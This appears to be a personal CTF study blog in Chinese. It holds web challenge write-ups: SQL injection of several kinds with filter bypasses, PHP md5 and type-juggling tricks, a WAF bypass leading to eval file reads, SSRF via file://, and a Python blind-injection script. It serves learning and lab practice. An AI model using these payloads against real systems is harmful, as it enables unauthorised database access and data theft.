---
title: web 刷题记录
date: '2025-05-05 09:29:25'
updated: '2025-05-08 23:57:20'
permalink: /post/web-question-record-z1c9rpq.html
comments: true
toc: true
---



# web 刷题记录

## SQL注入

---

#### [极客大挑战 2019]EasySQL

这道题一看就是sql注入，进入之后直接就想到刚学的

```
marin' or 1=1 --
```

但是发现无法成功，查找发现在sql中，注释符除了`--`还有`#`，#的使用更方便，--需要和后面的内容间隔一个空格，不过也有可能有些网站会过滤#号

```
marin' or 1=1 #
```

#### [SUCTF 2019]EasySQL

这题直接不会orz，查wp发现是不懂的堆叠查询

```
1; show databases;
```

先查数据库

![](https://pic1.imgdb.cn/item/679219bdd0e0a243d4f7287a.png)

```
1; show tables;
```

接着查表名

![](https://pic1.imgdb.cn/item/679219ded0e0a243d4f72882.png)

看到了flag，但是flag好像被过滤了

这里后面的就不是很懂，主要是看到的都是猜测后端查询的语句是

```sql
sql=select.post[‘query’]."||flag from Flag"
```

然后输入

```
*,1
```

语句就会变成

```sql
select * , 1||flag from Flag
select * , 1 from Flag
```

这个就会返回flag所有的列以及一个额外的列1

还有一种方法

```sql
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

这个方法也是利用堆叠，设置sql的模式，将管道符`||`视为连接符，之后就变成了

```sql
select concat(1,flag) from Flag 
```

#### [极客大挑战 2019]LoveSQL

拿到题，和之前有题的页面一样，尝试使用万能密码失败，在用户名处使用成功，观察url，发现是使用get传，尝试sql注入

报错所以是3

```
?username=1%27+order by 4%23&password=asd
```

数据库名和3成功在页面上显示出来

```
?username=1%27+union select 1,database(),3%23&password=asd
```

然后就是常规的注入

获取表名

```
?username=1%27+union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='geek' %23&password=asd
```

获取列名

```
?username=1%27+union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' %23&password=asd
```

获取数据

```
?username=1%27+union select 1,database(),group_concat(username,id,password) from l0ve1ysq1 %23&password=asd
```

#### [强网杯 2019]随便注

注入发现有过滤，一开始使用order by确定了只有2列，但是使用union的时候出问题了

```
?inject=1' union select 1,2#
```

![image-20250131105729216](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131105729216.png)

发现被过滤了

尝试使用堆叠注入

![image-20250131105816144](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131114222113.png)

```
?inject=1%27;show columns from `1919810931114514`%23
```

![image-20250131114222113](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131112930603.png)

![image-20250131114625294](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131105816144.png)

发现了flag的，但是不清楚怎么获取，查看wp思路

在另一个word表中有两个字段，而数字中只有一个字段，一开始使用order by发现有两个字段，所以这里应该是从word表中取出东西，而且word中的data和数字中的flag都是varchar字段，所以wp的思路是使用`rename`修改表名，把数字表改为`words`

wp的payload是

```
1';
rename table words to None; 
rename table `1919810931114514` to words;
alter table words add id int unsigned not NULL auto_increment primary key;
alter table words change flag data varchar(20);#
```

> 两个rename修改表名
>
> ```sql
> alter table words add id int unsigned not NULL auto_increment primary key;
> ```
>
> 因为原words表中有id字段，这里使用alter在新words中添加一个名为id的列
> int unsigned：数据类型
> not NULL：该列不为空
> auto_increment：该列的值自动递增
> primary key：设置为主键
>
> ```sql
> alter table words change flag data varchar(20);
> ```
>
> 将flag列重命名为data列，并修改数据类型

成功获取flag

![image-20250131112930603](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131114625294.png)

还看到另一个方法

因为select被过滤了，考虑用编码进行绕过

```sql
select * from `1919810931114514`
```

使用hex加密

```
0x73656c656374202a2066726f6d20603139313938313039333131313435313460
```

最终

```
1';
Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @a;
execute execsql;#
```

> ```
> Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
> ```
>
> 设置一个变量@a，并赋值
>
> ```
> prepare execsql from @a;
> ```
>
> 这个是预处理语句，将@a的值（解码后的sql语句）作为预处理语句的内容，命名为execsql
>
> ```
> execute execsql;
> ```
>
> 执行预处理语句

#### [极客大挑战 2019]BabySQL

注了半天，没想明白怎么注的，查的wp

发现原来是被过滤成空格了，如select、union 、or等都被变成空格了，这里学到一个新的绕过方法：双写绕过
原理很简单，就是网站的过滤有时候可能没那么严谨，只会过滤掉一些关键词，我们找到这些关键词，如select，就可以用`seselectlect`，当过滤掉select时，剩下的字符串拼接在一起，就会恢复成原始有效的关键字，进行绕过

```
?username=1%2B&password=admin' oorrder bbyy 4 --+
```

这里因为过滤掉了or，所以使用order的时候就回先过滤掉or，只要绕过or就会拼接成order

```
?username=1+%2B&password=admin' uunionnion seselectlect 1,2,3--+
```

之后都是常规的方法

```
?username=1%2B&password=admin' uunionnion seselectlect 1,database(),group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema='geek'--+
```

```
?username=1%2B&password=admin' uunionnion seselectlect 1,database(),group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_name='b4bsql'--+
```

```
?username=1%2B&password=admin' uunionnion seselectlect 1,database(),group_concat(id,username,passwoorrd) ffromrom b4bsql--+
```

最后得到flag

#### [极客大挑战 2019]HardSQL

尝试了双写绕过，union啥的都不行，查wp发现是空格被过滤了

> 这里使用`()`来绕过空格，括号是用来包含子查询的，任何可以计算出结果的语句都可以用括号括起来，括号两端可以没有多余的空格

是url编码的问题
这题和之前不一样，如果不url编码就绕过不了

![image-20250210102242526](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210102242526.png)

![image-20250210110316017](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210102309753.png)

然后继续尝试，使用报错注入

```
?username=111'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23
```

查到数据库名geek

然后这里好像还过滤了=号，所以查表名要换`like`用法

> like可以用来筛选特定的记录

```
?username=111'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))%23
```

![image-20250210110052641](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210110316017.png)

```
?username=111'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23
```

![image-20250210102309753](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210110052641.png)

```
?username=111'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23
```

![image-20250210110622237](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210110622237.png)

这里发现flag显示不全，发现要用`substring`于`mid`来绕过，但是被过滤了，这里就可以用`right`和`left`来绕过

这里要拿到右边的flag

```
?username=111'or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))%23
```

成功获取到完整flag

![image-20250207174248753](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210111352198.png)

![image-20250314213021135](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250314213021135.png)

#### [BJDCTF2020]Easy MD5

拿到题目，试了sql，试了命令注入，但是都没有回显，蒙了，查源码没发现东西，只知道传入的是password参数

查看wp，才知道在回显处有提示

![image-20250207165217996](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207165217996.png)

```sql
 select * from 'admin' where password=md5($pass,true)
```

> md5($pass, true)：这个后面的true默认值是false，就会返回32字符的hex字符串
>
> 如果为true，就会返回hex的二进制数据（RAW格式）

就是sql注入，但是注入的内容被md5加密了

所以为了绕过这个，需要被md5加密之后得到的值变为raw格式后让原查询句子变为

```sql
 select * from 'admin' where password='' or '1'
```

后面是什么数字都行

这里想用代码跑一个出来，不过想想就知道不可能，于是就用了wp中给的，记住其实应该就行（

```
ffifdyop
md5值为：
'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
```

成功进入下一个页面

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->

```

这里在回显处找到这个被注释的代码，要求a和b不同，但是a和b的md5值要相同，这里想到的是==是弱比较，如果前面和后面得到的md5值的前面数值都一样就行，不过看wp的解释是使用科学计数法，也是弱比较的一种，md5值为0e的时候会视为科学计数法，无论后面的值是什么，0的多少次方都是0，就能绕过了

```
QNKCDZO和s878926199a
```

得到最后一个

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

这里是强比较

这里学到了一个新的方法

数组绕过

在php中，如果传入`?a[]=1&b[]=2`这样的，php会自动解析为数组
a[]=1会把a转为一个数组，即`$a=[1]`，b也是一样的

但是在web中，如果应用没有正确处理数组，就会出现漏洞

* 应用要检查a的值是否为特定值，但是没有考虑是不是数组，就会被绕过验证
* md5函数在接受参数的时候，如果传入的不是字符串，而是数组，就无法解出数值，并且不会报错

这题就利用这一点，使用数组绕过，就可以获得flag，并且第二个步骤也可以使用

![image-20250212155634155](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207174248753.png)

#### [GXYCTF2019]BabySQli

测试，发现=、（）、or被过滤了

使用union 判断字段数是3个

![image-20250212155331341](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212155331341.png)

在这个页面的源代码中有提示（没发现，看wp才知道

![image-20250210111352198](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212155634155.png)

解码后得到

```sql
select * from user where username = '$name'
```

然后继续使用union判断字段，猜测使用admin

![image-20250212160412022](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212160412022.png)

根据报错user字段是在第二个

后面就全是查wp的（看的wp都是查看源码发现要传入md5值的

* sqli有个特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据

所以猜测第3个字段就是密码的字段，这里查看题目github源码发现password被md5加密，所以传入的pw参数会被md5加密后，再和数据库中比较

根据特性，联合查询时传入一个不存在数据的md5值，就会被存放到password的数据库中，然后pw传入这个值，就能成功登录

这里的`c4ca4238a0b923820dcc509a6f75849b`就是1的md5值

```sql
name=1'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```

![image-20250212161315813](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212161315813.png)

#### [GYCTF2020]Blacklist

测试了是字符型注入，尝试union注入后得到提示

```
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

然后继续尝试，用堆叠注入成功了

查数据库

```
1';show databases--+
```

![image-20250212171657465](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212171657465.png)

查表名

```
1';show tables--+
```

![image-20250212171746388](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212171746388.png)

查列名（这里要用反引号

```
1';show columns from `FlagHere`--+
```

![image-20250213202258020](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212172043889.png)

因为之前发现rename被过滤了，所以之前做过的使用rename改名的方法不行了

查wp，发现一个新方法

> **handler**命令
>
> 查询规则
>
> ```sql
> handler table_name open;
> handler table_name read first;
> handler table_name close;
> ```
>
> 打开数据库，读取第一行数据，读取成功后关闭
>
> ```sql
> handler table_name open;
> handler table_name read next;
> handler table_name close;
> ```
>
> 打开数据库，开始循环读取，读取成功后关闭

构造payload后成功读取flag

```
1';handler FlagHere open;handler FlagHere read next; handler FlagHere close;--+
```

#### [CISCN2019 华北赛区 Day2 Web1]Hack World

![image-20250213202134088](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202134088.png)

拿到题目发现表名和列名都给了，然后开始测试，发现很多都给过滤了，拿burp测了测，长度为525的没被过滤，但是都么啥有用的东西

![image-20250213202731621](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202258020.png)

但是发现在数字后面加个单引号，就会触发这个，不知道是为什么

![image-20250212172043889](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202410839.png)

然后又测试了一下，发现1会输出一句话

![image-20250213202410839](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202731621.png)

接着尝试，发现传入一个true也可以，那这里其实可以用布尔盲注

![image-20250215113024445](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202755975.png)

构造payload

```
0^(ascii(substr((select(flag)from(flag)),1,1))=102)
```

> `^`是异或的符号，所以这里使用0和后面的结果异或，当后面的结果为true时，返回1，为false时，为0
>
> `(select(flag)from(flag))`从flag表中寻找flag列
>
> `substr((payload),1,1)`用substr从第一个字符开始截取一个字符
>
> `ascii()=102`判断这个字符的值是否等于102

本来想用burp来爆破的，但是想了想flag应该挺长，爆出来还要自己拼，就写了一个脚本

```python
import requests

url = 'http://893c0d7b-a16b-477b-bbf1-bcae5fed8692.node5.buuoj.cn:81/index.php'

flag = ""
num = 1

while (True):
    for i in range(32, 128):
        key = {
        'id': f"0^(ascii(substr((select(flag)from(flag)),{num},1))={i})"
        }
        resp = requests.post(url, data=key)
        resp.encoding = 'utf-8'
        if 'Hello' in resp.text:
            print('true')
            flag += chr(i)
            print(flag)
            num += 1
            break
        
    if "}" in flag:
        print(''.join(flag))
        break

```

![image-20250213202755975](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213203450873.png)

成功爆到flag

#### [网鼎杯 2018]Fakebook

看题目，没找到有用的东西，使用dirsearch扫描

```
python dirsearch.py -u    --delay 0.1 -t 1
```

![image-20250215112400619](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112219717.png)

发现了robots.txt，其他的访问都没有东西

![image-20250213203450873](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112252763.png)

找到了user.php.bak，下载下来查看

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

登录进去，只有名字可以点，这个应该就是php中get url中拿到的

![image-20250215112252763](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112400619.png)

点进去，发现有个参数，想到之前扫到的db.php，尝试注入

![image-20250215112438137](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112646132.png)

报错确定是sql注入，然后尝试了一下，发现是数字型的

![image-20250215112752693](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112752693.png)

![image-20250215112646132](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112729910.png)

使用and，成功确定

![image-20250215112729910](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215113024445.png)

确定列数

```
?no=1 order by 4
```

使用union select 时不行，单独使用union和select都不会触发，应该是过滤了union select，中间加个注释符

![image-20250215112846351](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112846351.png)

```
?no=-1 union/**/select 1,2,3,4
```

看到2是显示出来的

![image-20250215112219717](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112438137.png)

爆数据库

```
?no=-1 union/**/select 1,database(),3,4
```

爆表

```
?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'
```

爆列

```
?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
```

```
no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```

爆数据

```
?no=-1 union/**/select 1,concat(no,'~',username,'~',passwd,'~',data),3,4 from users
```

得到

```
1~marin~3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2~O:8:"UserInfo":3:{s:4:"name";s:5:"marin";s:3:"age";i:123;s:4:"blog";s:21:"https://wwwmarin.xyz/";}
```

看到最后的data就是序列化的数据

猜测这个应该就是第4个数据传进去的，构造序列化

```php
<?php
class UserInfo
{
    public $name = "marin";
    public $age = 0;
    public $blog = "www.baidu.com";
}

$a = new UserInfo();
$b = serialize($a);
echo $b;
```

使用百度网页试试

![image-20250215114117646](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215114117646.png)

成功修改，查看源代码，能发现已经被base64加密了，现在就可以查看flag.php

![image-20250215114132425](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215114132425.png)

并且根据前面的报错知道了 **/var/www/html/view.php**这个路径，所以flag.php也应该在这里

最后payload

```
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"marin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

得到flag

这题查wp发现是算ssrf，看wp发现`curl_exec()`，这个php函数可能会导致ssrf漏洞

> **`curl_exec()`**会通过 `curl_setopt()` 配置的选项，向指定url发送请求，所以可能会导致ssrf

这题还有一个方法，因为没有过滤`load_file`，所以这个可以直接访问

```
?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4
```

#### [NCTF 2018]滴!晨跑打卡

这题很直接就把查询sql代码给了，测试了一下，过滤了空格，注释符，导致末尾会一直报错

这里使用 `%a0` 绕过空格，使用 `||` 绕过最后的 '' 导致的报错

```
1'%a0union%a0select%a01,database(),3,4||'1
```

> `||`  在不同的数据库中有不同的作用
>
> 1. mysql中， `||` 相当于 `or`
>    `|| '1'` 相当于 `or 1` 返回一个1
> 2. 其他数据库中，`||` 相当于字符串连接符
>    `4 || '1'` 返回 41

爆表名

这里还发现可以用 `and '1' = '1` 来绕过后面的 `'`

```
1'%a0union%a0select%a0(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='pcnumber'),database(),1,2%a0and%a0'1'='1
```

爆列名

```
1'%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='pcnumber'),database(),1,2%a0and%a0'1'='1
```

![image-20250408165928655](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250408165928655.png)

```
1'%a0union%a0select%a0(select%a0group_concat(flag)%a0from%a0pcnumber),database(),1,2%a0and%a0'1'='1
```

### sqli-lab

#### lab1

页面要输入一个id，直接在url后加?id=1
成功查询到名字，然后尝试注入

```
/?id=1'--      //报错
/?id=1'--+     //没报错
```

* 这里是因为sql中`--`注释符需要后面跟一个空格，在url编码中`--+`中的+相当于空格

然后尝试基础的注入，没成功，于是尝试UNION注入

```
/?id=1' order by 3 --+
```

* order by 是用来排序的sql语句，在注入中，可以用来探测列数，当报错了就是超出了列的数量

这里的3刚好是没报错，然后继续

```
?id=-1'union select 1,2,3--+
```

使用-1使前面的结果集为空，union合并后输出，发现2和3会输出到页面上，利用这个输出需要的内容

```
?id=-1'union select 1,database(),version()--+

Welcome    Dhakkan
Your Login name:security
Your Password:10.2.26-MariaDB-log
```

```
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

Welcome    Dhakkan
Your Login name:2
Your Password:emails,referers,uagents,users
```

> `group_concat(table_name) from information_schema.tables where table_schema='security'`
>
> `group_concat(table_name)`：这是一个聚合函数，将多行数据合并为一个字符串，table_name是要合并的列，默认这个函数会用逗号分隔结果
>
> `from information_schema.tables`：这个是mysql中的一个系统表，存储了数据库中所有表的信息，有以下几个列
>
> * `table_schema`：数据库名称
> * `table_name`：表名称
> * `table_type`：表类型（如 `BASE TABLE` 或 `VIEW`）
>
> `where table_schema='security'`：用来指定数据库

接下来要获取数据，猜测用户的账户应该会在users表中

```
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

> 这个就差不多了
>
> `from information_schema.columns`：这个是一个系统表，存储了数据库中所有表的列信息，有以下几个重要列
>
> - `table_schema`：数据库名称。
> - `table_name`：表名称。
> - `column_name`：列名称。
> - `data_type`：列的数据类型。

```
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```

最后将数据输出出来就行

#### lab2

这里记录一下上面没记得一个内容

**如何判断是字符型注入还是数字型注入**

1. 数字型

```sql
select * from users where id = x
```

这种可以用`and 1 = 1` `and 1 = 2`判断

```
?id = x and 1=1     //页面正常
?id = x and 1=2     //页面报错，这说明存在数字型注入
```

2. 字符型

```sql
select * from users where id = 'x'
```

这种可以用`'and '1' = '1` `'and '1' = '2`判断

```
?id=1' and '1'='1	//页面正常
?id=1' and '1'='2	//页面报错，这说明存在字符型注入
```

* 字符型和数字型最大的区别就是要不要单引号闭合

这题一就需要判断了，一开始用单引号发现报错了，直接加就没问题

```
?id=1 order by 3  	//获取列数
```

后面基本一样了

```
?id=-1 union select 1,2,3    					// 还是2，3
?id=-1 union select 1,database(),version() 		 //获取数据库名
?id=-1 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'					 //获取表名
?id=-1 union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='users'						   //获取列名
?id=-1 union select 1,database(),group_concat(username,id,password) from users 
											  // 获取数据
```

#### lab3

~~发现也是数字型~~，看的不仔细orz
输入`?id=1'`的时候报错了，下意识以为是字符型，其实不是

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''8'') LIMIT 0,1' at line 1
```

这个报错其实是在单引号后面还有一个括号，要将括号补充上

```
?id=8') order by 3 --+
```

后面就一样的，只是加了个括号

#### lab4

输入单引号没用，尝试发现双引号报错`use near '"1"")`，猜测是还要用括号

```
?id=1")--+
```

成功注入

后续就一样了

#### lab5

也是检查什么类型，不过这个没有返回，只会显示成功进入，用数字型的尝试没有用，于是用字符型的

```
?id=1' and 1=2 --+
```

成功让页面报错，那么这个就可以用报错注入

这里在网上学到了几个手工报错方法，都记录一下

1. floor() 报错注入
   该语句的输出字符长度为64个字符

   ```sql
   and (select 1 from 
   (select count(*),concat(payload),floor(rand(0)*2))x 
   from information_schema.tables group by x)a)
   ```

   > **内层查询**
   >
   > ```sql
   > (select count(*),concat((payload),floor (rand(0)*2)) as x  
   > from information_schema.tables group by x)
   > ```
   >
   > `select count(*)`：统计每个分组后的行数，但是分组冲突无法统计，这里只是配合group by分组
   >
   > `concat((payload),floor(rand(*)*2)) x`：payload是希望获取的数据
   > `floor()`是向下取整
   > `rand(0)`是随机数生成函数，里面指定了种子0，生成固定的伪随机序列
   > `floor(rand(*)*2)`就会生成0或1的一个序列
   >
   > `group by x`：这个是对查询结果进行分组
   > 这个报错的核心就是这个和floor()，因为`floor(rand(*)*2)`会产生01的序列和前面的payload拼接
   > 在mysql中，执行group by语句和count时，会创建一个虚拟表，进行计数和分组
   >
   > group by 后面的字段和虚拟表进行对比
   > 如果存在，就计数加1
   > 如果不存在，就会插入，在插入时会再运算一次结果，因为rand的随机性，导致第二次运算的结果和第一次不一样，运算的结果存在虚拟表中，就会报错
   >
   > **外层查询**
   >
   > ```sql
   > (select 1 from ()a)
   > ```
   >
   > 最后的a就是内存查询的别名，让外层查询引用，这个是必要的
   >

   ```sql
   union select count(*),0,concat((payload),floor(rand()*2))as a from information_schema.tables group by a limit 0,10 
   ```
2. updatexml() 报错注入

   长度限制是32位

   ```sql
   and updatexml(1,payload,1)
   ```

> `updatexml(xml_target, xpath_expr, new_value)`：该函数是用来更新XML文档的某个节点
> `xml_target`  xml文档
> `xpath_expr`  Xpath表达式，用来定位要更新的节点
> `new_value`    新的节点值
>
> 报错的原因是当该函数执行时，如果出现xml文档路径错误就会报错

3. extractValue()  报错注入

   长度限制是32位

   ```sql
   and extractvalue(1, payload)
   ```

   > `extractvalue(xml_target, xpath_expr)`：该函数用来提取XML文档中某个节点的值
   > `xml_target`  xml文档
   > `xpath_expr`   Xpath表达式，用来定位要提取的节点
   >
   > 这个的报错原因和上面一样
   >

然后开始尝试

1. floor（）
   获取数据库名

```
?id=1'and (select 1 from 
(select count(*),concat((database()),floor(rand(0)*2))x 
from information_schema.tables group by x)a) --+
```

```
Duplicate entry 'security1' for key 'group_key'
```

​	然后获取表名

```
?id=1'union select count(*),0,concat((select table_name from information_schema.tables where 
table_schema='security' limit 3,1),floor(rand(0)*2))as a from information_schema.tables group by a --+
```

```
Duplicate entry 'users1' for key 'group_key'
```

## PHP

---

### php审计

#### [极客大挑战 2019]Havefun

启动靶机，页面上没什么东西，查看源码，发现有一段被注释的php代码

```php
$cat=$_GET['cat'];
echo $cat;
if($cat=='dog'){
    echo 'Syc{cat_cat_cat_cat}';
}
```

```
$cat 这个是定义了一改变量名
$_GET 这个是一个从get中获取输入的传输cat的方法
echo 是php中输出字符串的方法
后面进行了一个比较，cat变量如果为dog，就会输出flag
```

所以构造payload

![](https://pic.imgdb.cn/item/673b3fdbd29ded1a8cba2af9.png)

在hackbar中点击load，获得url，然后在url后加上

```
/?cat = dog
```

成功得到flag

#### [ACTF2020 新生赛]BackupFile

拿到题目啥也没看出来，猜测是要找网站源码，尝试了知道得www.zip不对，就直接开始dirsearch扫了，要扫好久，看到前面得东西就开始尝试了

![image-20250215115423374](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250204160437034.png)

找到了index.php

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

那下面那个就是就是提供key参数的，一开始总结把源码中的str输入进去了，提示just num，随便试了一下123就对了

写完之后查了

> 在php中使用`==`进行比较时，会进行类型转化，key是整数，str是字符串，当用`==`进行比较时，会把字符串转换为整数，再进行比较
>
> str="123nladlnsda"，会被转换为123

![image-20250204160437034](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215115423374.png)

#### [RoarCTF 2019]Easy Calc

先查看源码，找到有一个calc.php文件，并且看到有waf，并且不是前端的waf，就以为是php写的waf，访问文件

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

发现就过滤了这些符号，尝试输入字母发现不行，查看wp发现这还有一个waf，并不是用php写的，但是会影响输入，查看了[[RoarCTF 2019]Easy Calc_[roarctf 2019]easy calc 1-CSDN博客](https://blog.csdn.net/weixin_44077544/article/details/102630714)学到了这题怎么做

> php知识点
>
> php对字符串会解析，php会将url或请求体中的查询字符串转化为内部`$_GET`或`$_POST`关联数组的参数，但是查询字符串在被php解析时，会被删除或用下划线代替
>
> ```
> /?%20news[id%00name=42
> 解析后
> Array([news_id] => 42)
> ```
>
> 就可以如果一些waf
>
> php会在解析查询字符串时将所有参数转换为有效变量名
>
> 1. 删除空白符
> 2. 将某些字符转换为下划线
> 3. 参数名忽略`\0`及其后面的内容

所以这一题在num前面加一个空格，就不会被waf识别，但是php可以正常识别，构造payload获取这个目录下的内容

```
/calc.php?%20num=var_dump(scandir(chr(47)));
```

> `var_dump()`：输出变量的详细信息，不仅会输出变量的值，还会输出变量的类型和长度
>
> `scandir()`：获取指定目录下的所有文件和文件夹名称，传入/，意味着列出系统根目录下所有文件
>
> `chr(47)`：返回指定的字符，47是`/`，用来扫描这个目录下的内容

![image-20250204171213331](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250204171213331.png)

发现有个f1agg文件，去读取这个文件就行

```
/calc.php?%20num=var_dump(file_get_contents(chr(47).f1agg));
```

> `file_get_contents`：是php用来读取文件内容的函数

吐槽一句，明明可以直接用f1agg，好多wp都非要用chr去表示，我还以为不行（

#### [MRCTF2020]Ez_bypass

直接拿到源码

```php
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

就两步，一步是get传参gg和id，用了强比较md5值，并且不能相同，使用数组绕过

第二步传post参数passwd，用了弱比较

![image-20250220152703494](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210100426799.png)

#### [网鼎杯 2020 朱雀组]phpweb

